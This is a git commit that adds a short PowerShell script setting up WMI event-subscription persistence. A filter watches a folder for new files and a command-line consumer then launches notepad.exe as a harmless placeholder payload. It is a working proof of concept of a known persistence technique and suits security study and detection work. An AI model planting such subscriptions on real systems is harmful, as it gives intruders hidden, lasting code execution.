c1310df2663c901287b146eadbdba25878503617
browninfosecguy <37906998+browninfosecguy@users.noreply.github.com>
2018-05-07 23:03:05 -0400

    Initial commit
    Initial Commit

---
+++ WMI-persistence.ps1
@@ -0,0 +1,18 @@
+﻿$WQLQuery = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 
+             WHERE TargetInstance ISA "CIM_DirectoryContainsFile"
+             AND TargetInstance.GroupComponent = "Win32_Directory.Name=\"C:\\\\test\""'
+
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="WatchFolder2EmailFilter";
+                 EventNameSpace="root\cimv2";
+                 QueryLanguage="WQL";
+                 Query=$WQLQuery
+                }
+
+
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WatchFolder2EmailConsumer";
+                 ExecutablePath = "C:\\Windows\\System32\\notepad.exe"
+                 CommandLineTemplate = "C:\\Windows\\System32\\notepad.exe"
+                }
+
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
